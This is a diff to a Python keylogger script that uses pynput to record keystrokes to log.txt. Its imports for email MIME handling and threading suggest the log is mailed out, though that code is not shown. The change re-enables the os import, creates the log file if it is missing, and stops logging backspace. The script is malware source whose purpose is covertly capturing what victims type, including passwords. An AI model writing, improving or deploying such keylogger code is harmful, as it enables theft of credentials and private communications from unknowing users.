@@ -6,10 +6,16 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import threading
-# import os
+import os
 # import sys
 # import subprocess
+def create_log_file():
+    with open("log.txt", "w"):
+        pass
 
+#Check if log.txt file exists, if not, create it
+if not os.path.exists("log.txt"):
+    create_log_file()
 
 keys = []
 
@@ -31,7 +37,7 @@ def writefile(key):
                 f.write(' ')
             elif key == Key.enter:
                 f.write('\n')
-            elif key == Key.cmd or key == Key.shift or key == Key.ctrl_l or key == Key.ctrl_r or key == Key.esc or key == Key.caps_lock or key == Key.alt_l or key == Key.alt_r or key == Key.alt_gr or key == Key.right or key == Key.left or key == Key.up or key == Key.down or key == Key.shift_r or key == Key.tab or key == Key.end or key == Key.page_down or key == Key.page_up:
+            elif key == Key.cmd or key == Key.backspace or key == Key.shift or key == Key.ctrl_l or key == Key.ctrl_r or key == Key.esc or key == Key.caps_lock or key == Key.alt_l or key == Key.alt_r or key == Key.alt_gr or key == Key.right or key == Key.left or key == Key.up or key == Key.down or key == Key.shift_r or key == Key.tab or key == Key.end or key == Key.page_down or key == Key.page_up:
                 pass
             else:
                 f.write(str(key))
